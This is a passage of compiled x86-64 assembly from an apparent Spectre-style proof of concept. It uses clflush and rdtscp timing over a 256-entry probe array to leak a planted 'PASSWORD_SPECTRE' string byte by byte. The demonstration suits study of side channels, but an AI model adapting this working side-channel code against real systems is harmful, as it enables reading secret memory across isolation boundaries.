	movl	$0, -1080(%rbp)
	movl	$0, -1084(%rbp)
LBB1_3:                                 ##   Parent Loop BB1_1 Depth=1
                                        ## =>  This Loop Header: Depth=2
                                        ##       Child Loop BB1_5 Depth 3
                                        ##       Child Loop BB1_9 Depth 3
	cmpl	$10000, -1084(%rbp)    # # imm = 0x2710
	jge	LBB1_17
## %bb.4:                               ##   in Loop: Header=BB1_3 Depth=2
	movq	_memory_slot_ptr@GOTPCREL(%rip), %rax
	movq	_memory_slot@GOTPCREL(%rip), %rcx
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	leaq	_secret_key(%rip), %rcx
	movq	%rcx, (%rax)
	movq	_memory_slot_ptr@GOTPCREL(%rip), %rax
	clflush	(%rax)
	movl	$0, -1088(%rbp)
LBB1_5:                                 ##   Parent Loop BB1_1 Depth=1
                                        ##     Parent Loop BB1_3 Depth=2
                                        ## =>    This Inner Loop Header: Depth=3
	cmpl	$256, -1088(%rbp)    # # imm = 0x100
	jge	LBB1_8
## %bb.6:                               ##   in Loop: Header=BB1_5 Depth=3
	movl	-1088(%rbp), %eax
	shll	$12, %eax
	movslq	%eax, %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	clflush	(%rax)
## %bb.7:                               ##   in Loop: Header=BB1_5 Depth=3
	movl	-1088(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1088(%rbp)
	jmp	LBB1_5
LBB1_8:                                 ##   in Loop: Header=BB1_3 Depth=2
	mfence
	movslq	-1076(%rbp), %rdi
	callq	_victim_function
	movl	$0, -1092(%rbp)
LBB1_9:                                 ##   Parent Loop BB1_1 Depth=1
                                        ##     Parent Loop BB1_3 Depth=2
                                        ## =>    This Inner Loop Header: Depth=3
	cmpl	$256, -1092(%rbp)    # # imm = 0x100
	jge	LBB1_15
## %bb.10:                              ##   in Loop: Header=BB1_9 Depth=3
	movl	-1092(%rbp), %eax
	shll	$12, %eax
	movslq	%eax, %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	addq	%rcx, %rax
	movq	%rax, -1104(%rbp)
	leaq	-1080(%rbp), %rax
	movq	%rax, -1064(%rbp)
	movq	-1064(%rbp), %rax
	movq	%rax, -1144(%rbp)    # # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-1144(%rbp), %rcx    # # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	movq	%rax, -1112(%rbp)
	movq	-1104(%rbp), %rax
	movb	(%rax), %al
	movzbl	%al, %eax
	movl	%eax, -1080(%rbp)
	leaq	-1080(%rbp), %rax
	movq	%rax, -1072(%rbp)
	movq	-1072(%rbp), %rax
	movq	%rax, -1136(%rbp)    # # 8-byte Spill
	rdtscp
	movq	%rdx, %rsi
	movl	%ecx, %edx
	movq	-1136(%rbp), %rcx    # # 8-byte Reload
	shlq	$32, %rsi
	orq	%rsi, %rax
	movl	%edx, (%rcx)
	subq	-1112(%rbp), %rax
	movq	%rax, -1120(%rbp)
	cmpq	$100, -1120(%rbp)
	ja	LBB1_13
## %bb.11:                              ##   in Loop: Header=BB1_9 Depth=3
	movl	-1092(%rbp), %eax
	movslq	-1076(%rbp), %rdx
	leaq	_public_key(%rip), %rcx
	movzbl	(%rcx,%rdx), %ecx
	cmpl	%ecx, %eax
	je	LBB1_13
## %bb.12:                              ##   in Loop: Header=BB1_9 Depth=3
	movslq	-1092(%rbp), %rax
	movl	-1056(%rbp,%rax,4), %ecx
	addl	$1, %ecx
	movl	%ecx, -1056(%rbp,%rax,4)
LBB1_13:                                ##   in Loop: Header=BB1_9 Depth=3
	jmp	LBB1_14
LBB1_14:                                ##   in Loop: Header=BB1_9 Depth=3
	movl	-1092(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1092(%rbp)
	jmp	LBB1_9
LBB1_15:                                ##   in Loop: Header=BB1_3 Depth=2
	jmp	LBB1_16
LBB1_16:                                ##   in Loop: Header=BB1_3 Depth=2
	movl	-1084(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1084(%rbp)
	jmp	LBB1_3
LBB1_17:                                ##   in Loop: Header=BB1_1 Depth=1
	movl	-1080(%rbp), %ecx
	movb	_tmp(%rip), %al
	movzbl	%al, %eax
	xorl	%ecx, %eax
                                        ## kill: def $al killed $al killed $eax
	movb	%al, _tmp(%rip)
	movl	$-1, -1124(%rbp)
	movl	$0, -1128(%rbp)
LBB1_18:                                ##   Parent Loop BB1_1 Depth=1
                                        ## =>  This Inner Loop Header: Depth=2
	cmpl	$256, -1128(%rbp)    # # imm = 0x100
	jge	LBB1_24
## %bb.19:                              ##   in Loop: Header=BB1_18 Depth=2
	cmpl	$0, -1124(%rbp)
	jl	LBB1_21
## %bb.20:                              ##   in Loop: Header=BB1_18 Depth=2
	movslq	-1124(%rbp), %rax
	movl	-1056(%rbp,%rax,4), %eax
	movslq	-1128(%rbp), %rcx
	cmpl	-1056(%rbp,%rcx,4), %eax
	jge	LBB1_22
LBB1_21:                                ##   in Loop: Header=BB1_18 Depth=2
	movl	-1128(%rbp), %eax
	movl	%eax, -1124(%rbp)
LBB1_22:                                ##   in Loop: Header=BB1_18 Depth=2
	jmp	LBB1_23
LBB1_23:                                ##   in Loop: Header=BB1_18 Depth=2
	movl	-1128(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1128(%rbp)
	jmp	LBB1_18
LBB1_24:                                ##   in Loop: Header=BB1_1 Depth=1
	movl	-1076(%rbp), %esi
	movl	-1124(%rbp), %edx
	movslq	-1124(%rbp), %rax
	cvtsi2sdl	-1056(%rbp,%rax,4), %xmm0
	movsd	LCPI1_1(%rip), %xmm1    # # xmm1 = [1.0E+2,0.0E+0]
	mulsd	%xmm1, %xmm0
	movsd	LCPI1_0(%rip), %xmm1    # # xmm1 = [1.0E+4,0.0E+0]
	divsd	%xmm1, %xmm0
	leaq	L_.str(%rip), %rdi
	movb	$1, %al
	callq	_printf
	movl	-1124(%rbp), %eax
	movb	%al, %cl
	movslq	-1076(%rbp), %rax
	movb	%cl, -32(%rbp,%rax)
## %bb.25:                              ##   in Loop: Header=BB1_1 Depth=1
	movl	-1076(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -1076(%rbp)
	jmp	LBB1_1
LBB1_26:
	leaq	-32(%rbp), %rsi
	leaq	L_.str.1(%rip), %rdi
	movb	$0, %al
	callq	_printf
	movq	___stack_chk_guard@GOTPCREL(%rip), %rax
	movq	(%rax), %rax
	movq	-8(%rbp), %rcx
	cmpq	%rcx, %rax
	jne	LBB1_28
## %bb.27:
	addq	$1152, %rsp    # # imm = 0x480
	popq	%rbp
	retq
LBB1_28:
	callq	___stack_chk_fail
	.cfi_endproc
                                        ## -- End function
	.globl	_main                           ## -- Begin function main
	.p2align	4, 0x90
_main:
	.cfi_startproc
## %bb.0:
	pushq	%rbp
	.cfi_def_cfa_offset 16
	.cfi_offset %rbp, -16
	movq	%rsp, %rbp
	.cfi_def_cfa_register %rbp
	subq	$16, %rsp
	movl	$0, -4(%rbp)
	movl	$0, -8(%rbp)
LBB2_1:                                 ## =>This Inner Loop Header: Depth=1
	movslq	-8(%rbp), %rax
	cmpq	$1048576, %rax    # # imm = 0x100000
	jae	LBB2_4
## %bb.2:                               ##   in Loop: Header=BB2_1 Depth=1
	movslq	-8(%rbp), %rcx
	movq	_probe@GOTPCREL(%rip), %rax
	movb	$1, (%rax,%rcx)
## %bb.3:                               ##   in Loop: Header=BB2_1 Depth=1
	movl	-8(%rbp), %eax
	addl	$1, %eax
	movl	%eax, -8(%rbp)
	jmp	LBB2_1
LBB2_4:
	callq	_attacker_function
	movl	-4(%rbp), %eax
	addq	$16, %rsp
	popq	%rbp
	retq
	.cfi_endproc
                                        ## -- End function
	.section	__DATA,__data
	.globl	_secret_key                     ## @secret_key
	.p2align	4, 0x0
_secret_key:
	.asciz	"PASSWORD_SPECTRE"
	.globl	_public_key                     ## @public_key
	.p2align	4, 0x0
_public_key:
	.asciz	"################"
	.globl	_tmp                            ## @tmp
.zerofill __DATA,__common,_tmp,1,0
	.comm	_memory_slot_ptr,2048,4         ## @memory_slot_ptr
	.comm	_probe,1048576,4                ## @probe
	.comm	_memory_slot,2048,4             ## @memory_slot
	.section	__TEXT,__cstring,cstring_literals
	L_.str	:    # # @.str
	.asciz	"idx:%2d, highest:%c, hitrate:%f\n"
	L_.str.1	:    # # @.str.1
	.asciz	"%s\n"
.subsections_via_symbols
